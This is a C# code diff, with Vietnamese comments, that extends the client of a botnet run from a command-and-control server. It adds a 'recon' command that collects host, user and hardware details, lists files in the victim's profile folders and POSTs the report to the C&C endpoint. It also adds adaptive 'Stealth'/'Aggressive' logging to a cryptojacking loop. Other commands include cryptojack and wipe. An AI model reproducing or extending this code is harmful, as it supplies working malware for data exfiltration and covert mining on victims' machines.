@@ -16,6 +16,8 @@ public static class BotCommands
     public const string Cryptojack = "cryptojack";
     public const string Idle = "idle";
     public const string Wipe = "wipe";
+    public const string Recon = "recon";
+    public const string ReconDone = "recon_done";
 }
 //public class CryptoJackResult
 //{
@@ -32,6 +34,12 @@ public static class BotCommands
 public class BotInfoPayload { public string Status { get; set; } }
 public class LogPayload { public string Message { get; set; } }
 public class ResultPayload { public long Nonce { get; set; } public string Hash { get; set; } }
+public class ReconPayload
+{
+    public string Report { get; set; }
+}
+
+
 
 public class Bot
 {
@@ -307,6 +315,144 @@ public class Bot
                     GC.WaitForPendingFinalizers();
                 }
                 break;
+
+            case BotCommands.Recon: // <=== THÊM MỚI CASE NÀY
+                if (currentStatus == BotCommands.Recon || currentStatus == BotCommands.ReconDone)
+                {
+                    // Do nothing (tránh spam)
+                    return;
+                }
+
+                // Nếu trạng thái khác (Idle, Cryptojack) thì mới bắt đầu Recon
+                StopCurrentTask();
+                currentStatus = BotCommands.Recon;
+                Console.ForegroundColor = ConsoleColor.Cyan;
+                Console.WriteLine("[CMD] Received RECON command. Gathering system info...");
+                _ = PerformReconTask();
+                break;
+        }
+    }
+
+    static async Task PerformReconTask()
+    {
+        try
+        {
+            StringBuilder report = new StringBuilder();
+            report.AppendLine($"=== RECON REPORT FROM {Environment.MachineName} ===");
+            report.AppendLine($"Time: {DateTime.Now}");
+            report.AppendLine($"OS: {Environment.OSVersion}");
+            report.AppendLine($"User: {Environment.UserName}");
+            report.AppendLine("--------------------------------------------------");
+
+            // 1. Lấy thông tin phần cứng (CPU/RAM)
+            try
+            {
+                // CPU
+                report.AppendLine("[HARDWARE]");
+                using (var searcher = new ManagementObjectSearcher("select Name, NumberOfCores from Win32_Processor"))
+                {
+                    foreach (ManagementObject obj in searcher.Get())
+                    {
+                        report.AppendLine($"CPU: {obj["Name"]} ({obj["NumberOfCores"]} Cores)");
+                    }
+                }
+
+                // RAM
+                using (var searcher = new ManagementObjectSearcher("SELECT TotalPhysicalMemory FROM Win32_ComputerSystem"))
+                {
+                    foreach (ManagementObject obj in searcher.Get())
+                    {
+                        long ramBytes = Convert.ToInt64(obj["TotalPhysicalMemory"]);
+                        double ramGB = Math.Round(ramBytes / (1024.0 * 1024 * 1024), 2);
+                        report.AppendLine($"RAM: {ramGB} GB");
+                    }
+                }
+
+                // Disk
+                foreach (DriveInfo d in DriveInfo.GetDrives())
+                {
+                    if (d.IsReady)
+                    {
+                        double free = Math.Round(d.TotalFreeSpace / (1024.0 * 1024 * 1024), 2);
+                        double total = Math.Round(d.TotalSize / (1024.0 * 1024 * 1024), 2);
+                        report.AppendLine($"Disk {d.Name} Free: {free}GB / {total}GB");
+                    }
+                }
+            }
+            catch (Exception ex) { report.AppendLine($"[!] Hardware Info Error: {ex.Message}"); }
+
+            report.AppendLine("--------------------------------------------------");
+
+            // 2. Quét nhanh Desktop và Documents (Giới hạn độ sâu để tránh quá nặng)
+            report.AppendLine("[FILE SYSTEM SCAN - TOP LEVEL]");
+            string userPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
+            ScanFolder(userPath, report, 0, 2); // Chỉ quét sâu 2 lớp thư mục
+
+            // 3. Gửi về Server
+            Console.WriteLine("[RECON] Sending report to C&C...");
+            await SendReconToServerAsync(report.ToString());
+
+            Console.WriteLine("[RECON] Report sent successfully.");
+
+            // Sau khi xong thì quay về Idle
+            currentStatus = BotCommands.ReconDone;
+            await SendLogToServerAsync("Recon complete. Waiting for new commands.");
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine($"[RECON ERROR] {ex.Message}");
+            await SendLogToServerAsync($"Recon Failed: {ex.Message}");
+            currentStatus = BotCommands.ReconDone;
+        }
+    }
+
+    static void ScanFolder(string path, StringBuilder sb, int currentDepth, int maxDepth)
+    {
+        if (currentDepth > maxDepth) return;
+        try
+        {
+            var dir = new DirectoryInfo(path);
+            var files = dir.GetFiles();
+
+            // Chỉ ghi tên thư mục nếu có file
+            if (files.Length > 0) sb.AppendLine($"\n[DIR] {path}");
+
+            foreach (var f in files)
+            {
+                // Chỉ lấy file nhỏ hơn 50MB và bỏ qua file hệ thống rác để log gọn
+                if (f.Length < 50 * 1024 * 1024)
+                {
+                    sb.AppendLine($"  - {f.Name} ({f.Length / 1024} KB)");
+                }
+            }
+
+            foreach (var d in dir.GetDirectories())
+            {
+                // Bỏ qua AppData để tránh spam log rác
+                if (!d.Name.StartsWith(".") && !d.Name.Contains("AppData"))
+                {
+                    ScanFolder(d.FullName, sb, currentDepth + 1, maxDepth);
+                }
+            }
+        }
+        catch { /* Bỏ qua lỗi Access Denied */ }
+    }
+
+    static async Task SendReconToServerAsync(string reportContent)
+    {
+        try
+        {
+            var payload = new ReconPayload { Report = reportContent };
+            var content = new StringContent(JsonSerializer.Serialize(payload), Encoding.UTF8, "application/json");
+            // Tăng timeout lên 10s vì báo cáo có thể dài
+            using (var cts = new CancellationTokenSource(TimeSpan.FromSeconds(10)))
+            {
+                await client.PostAsync($"{CncServerUrl}/bot/submitrecon", content, cts.Token);
+            }
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine($"[Network Error] Send Recon: {ex.Message}");
         }
     }
 
@@ -486,6 +632,7 @@ public class Bot
         return Task.Run(async () =>
         {
             int adaptiveHashesPerBurst = 10000;
+            string currentMode = "Stealth"; // Trạng thái hiện tại để so sánh
 
             // === QUAN TRỌNG: Bọc PerformanceCounter trong using để tự động hủy khi xong ===
             using (var cpuCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total"))
@@ -495,6 +642,7 @@ public class Bot
                     cpuCounter.NextValue(); // Lần gọi đầu luôn trả về 0
                 }
                 catch { }
+                await SendLogToServerAsync("Mining started [Initializing Adaptive Mode...]");
 
                 // Thread phụ theo dõi CPU (Cũng phải check token để dừng)
                 _ = Task.Run(async () =>
@@ -507,12 +655,22 @@ public class Bot
                             if (totalSystemCpuUsage > 50.0f)
                             {
                                 adaptiveHashesPerBurst = 100000; // Máy bận -> Đào mạnh (hoặc giảm tùy chiến thuật)
+                                if (currentMode != "Aggressive")
+                                {
+                                    currentMode = "Aggressive";
+                                    await SendLogToServerAsync($"[ADAPTIVE] System CPU is High ({totalSystemCpuUsage:F0}%). Switched to AGGRESSIVE mode.");
+                                }
                             }
                             else
+                        {
+                            adaptiveHashesPerBurst = 10000;
+                            if (currentMode != "Stealth")
                             {
-                                adaptiveHashesPerBurst = 10000;
+                                currentMode = "Stealth";
+                                await SendLogToServerAsync($"[ADAPTIVE] System CPU is Low ({totalSystemCpuUsage:F0}%). Switched to STEALTH mode.");
                             }
                         }
+                    }
                         catch { }
 
                         // Chờ 3s, nhưng nếu bị hủy thì thoát ngay
@@ -525,8 +683,6 @@ public class Bot
                 {
                     using (SHA256 sha256 = SHA256.Create())
                     {
-                        await SendLogToServerAsync("Mining started [CPU Intensive Mode].");
-
                         long nonce = 0;
 
                         // Vòng lặp chính: Check token liên tục
